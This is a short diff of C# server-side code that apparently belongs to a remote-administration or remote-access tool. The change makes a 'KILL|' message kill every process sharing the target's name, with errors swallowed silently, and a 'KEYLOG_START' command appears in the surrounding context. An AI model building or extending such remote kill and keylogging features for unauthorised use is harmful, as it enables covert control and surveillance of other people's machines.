@@ -262,11 +262,29 @@ namespace Server
                 }
                 else if (msg.StartsWith("KILL|"))
                 {
+                    string pidStr = msg.Substring(5).Trim();
+
+                    if (!int.TryParse(pidStr, out int pid))
+                        return;
+
                     try
                     {
-                        Process.GetProcessById(int.Parse(msg.Split('|')[1])).Kill();
+                        Process baseProcess = Process.GetProcessById(pid);
+                        string processName = baseProcess.ProcessName;
+
+                        foreach (var p in Process.GetProcessesByName(processName))
+                        {
+                            try
+                            {
+                                p.Kill();
+                                p.WaitForExit();
+                            }
+                            catch { }
+                        }
                     }
-                    catch { }
+                    catch
+                    {
+                    }
                 }
                 else if (msg == "KEYLOG_START")
                 {
